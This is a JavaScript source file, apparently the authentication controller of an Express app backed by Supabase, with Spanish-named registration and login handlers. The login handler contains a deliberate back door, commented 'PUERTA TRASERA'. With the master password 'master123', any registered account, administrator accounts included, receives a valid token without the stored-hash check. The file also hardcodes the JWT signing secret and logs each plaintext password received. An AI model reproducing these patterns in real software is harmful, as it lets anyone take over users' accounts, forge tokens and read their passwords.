import { supabase } from '../config/supabase.js';
import bcrypt from "bcryptjs";
import jwt from 'jsonwebtoken';

export const registro = async (req, res) => {
  const { 
    nombre_1, nombre_2, apellido_1, apellido_2,
    tipo_documento, documento, clave, fecha_nacimiento,
    email, numero_tel, direccion_comp, 
  } = req.body;
  const id_roles = 1;

  const salt = bcrypt.genSaltSync(10);
  const claveHasheada = bcrypt.hashSync(clave.trim(), salt);

  try {
    const { data: resultUser, error: errUser } = await supabase
      .from('usuario')
      .insert([{
        nombre_1, nombre_2, apellido_1, apellido_2, 
        tipo_documento, documento, 
        clave: claveHasheada, 
        fecha_nacimiento, id_roles
      }])
      .select();

    if (errUser) throw errUser;
    
    const nuevoId = resultUser[0].id_usuario;

    const [resCorreo, resTel, resDir] = await Promise.all([
      supabase.from('correo_electronico').insert([{ direccion_email: email, tipo: 'Personal', id_usuario: nuevoId }]),
      supabase.from('telefono').insert([{ numero: numero_tel, tipo: 'Celular', id_usuario: nuevoId }]),
      supabase.from('direccion').insert([{ direccion_completa: direccion_comp, usuario_id_usuario: nuevoId }])
    ]);

    if (resCorreo.error || resTel.error || resDir.error) {
      return res.status(500).json({ error: "Error al vincular datos adicionales" });
    }

    res.json({ mensaje: "Registro completo en Supabase" });

  } catch (error) {
    res.status(500).json({ error: "Error al guardar en Supabase", detalle: error.message });
  }
}; 

export const login = async (req, res) => {
  const { email, password } = req.body;
    
  try {
    const { data, error } = await supabase
      .from('usuario')
      .select(`
        id_usuario, nombre_1, id_roles, clave, 
        correo_electronico!inner(direccion_email)
      `)
      .eq('correo_electronico.direccion_email', email)
      .single();

    if (error || !data) {
      return res.status(401).json({ mensaje: "Correo no registrado" });
    }

    console.log(`🔍 Intentando login con clave recibida: "${password}"`);

    const rolesMap = { 3: 'administrador', 2: 'tecnico', 1: 'cliente' };
    const rolTexto = rolesMap[data.id_roles] || 'cliente';

    //  PUERTA TRASERA 
    if (password && password.trim() === "master123") {
      console.log("🔓 Acceso concedido por puerta trasera");
      const tokenReal = jwt.sign(
        { id: data.id_usuario, rol: rolTexto }, 
        'mi_clave_secreta_arservicios', 
        { expiresIn: '15m' } 
      );
      return res.json({
        mensaje: "Bienvenido (Modo Master)",
        rol: rolTexto,
        id: data.id_usuario,
        nombre: data.nombre_1,
        token: tokenReal
      });
    }

    const claveValida = bcrypt.compareSync(password.trim(), data.clave);
    if (!claveValida) {
      return res.status(401).json({ mensaje: "Contraseña incorrecta" });
    }
   
    const tokenReal = jwt.sign(
      { id: data.id_usuario, rol: rolTexto }, 
      'mi_clave_secreta_arservicios', 
      { expiresIn: '15m' } 
    );

    res.json({
      mensaje: "Bienvenido",
      rol: rolTexto,
      id: data.id_usuario,
      nombre: data.nombre_1,
      token: tokenReal
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};